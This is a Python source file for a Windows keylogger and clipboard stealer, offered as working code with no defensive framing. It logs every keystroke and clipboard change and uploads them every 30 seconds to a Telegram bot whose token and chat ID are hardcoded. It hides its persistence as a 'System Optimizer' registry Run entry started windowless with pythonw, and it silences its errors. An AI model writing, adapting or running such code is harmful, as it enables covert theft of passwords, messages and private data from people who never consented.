import os, sys, time, threading, requests, pyperclip, winreg as reg
from pynput import keyboard

# ==========================================
# CONFIGURATION (সবচেয়ে উপরে রাখা ভালো)
BOT_TOKEN = "8723448863:AAHrndQJbtHoDkw7GqavfCfqpp0bLSRLkwA"
CHAT_ID = "5515529017"
# ==========================================

API_FILE = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"

# Global variables for storing data
log_buffer = []
clipboard_buffer = []
last_clip = ""

# --- AUTO START LOGIC ---
def set_autostart():
    try:
        script_path = os.path.abspath(__file__)
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, "System Optimizer", 0, reg.REG_SZ, f'pythonw "{script_path}"')
        reg.CloseKey(reg)
    except Exception as e:
        pass 

# Function to send logs to Telegram
def send_to_tg():
    global log_buffer, clipboard_buffer
    while True:
        # 30 seconds wait for testing. Change to 600 for real use.
        time.sleep(30) 
        
        if not log_buffer and not clipboard_buffer:
            continue

        keys_text = "".join(log_buffer)
        clips_text = "".join(clipboard_buffer)
        full_content = f"--- KEYLOGS ---\n{keys_text}\n\n--- CLIPBOARD ---\n{clips_text}"
        
        try:
            with open("sys_log.txt", "w", encoding="utf-8") as f:
                f.write(full_content)
            with open("sys_log.txt", "rb") as f:
                requests.post(API_FILE, data={"chat_id": CHAT_ID}, files={"document": f})
            
            log_buffer.clear()
            clipboard_buffer.clear()
            os.remove("sys_log.txt")
        except Exception as e:
            pass

# Keyboard event handler
def on_press(key):
    try:
        log_buffer.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            log_buffer.append(" ")
        elif key == keyboard.Key.enter:
            log_buffer.append("\n")
        else:
            log_buffer.append(f" [{key}] ")

# Clipboard monitoring function
def check_clipboard():
    global last_clip
    while True:
        try:
            current_clip = pyperclip.paste()
            if current_clip != last_clip:
                clipboard_buffer.append(f"[{time.ctime()}] {current_clip}\n")
                last_clip = current_clip
        except:
            pass
        time.sleep(5)

# ==========================================
# MAIN EXECUTION BLOCK (একবারই থাকবে)
# ==========================================
if __name__ == "__main__":
    # 1. Auto-start set koro
    set_autostart()

    # 2. Telegram thread start koro
    tg_thread = threading.Thread(target=send_to_tg, daemon=True)
    tg_thread.start()

    # 3. Clipboard thread start koro
    clip_thread = threading.Thread(target=check_clipboard, daemon=True)
    clip_thread.start()

    # 4. Keyboard listener start koro (Main thread blocks here)
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()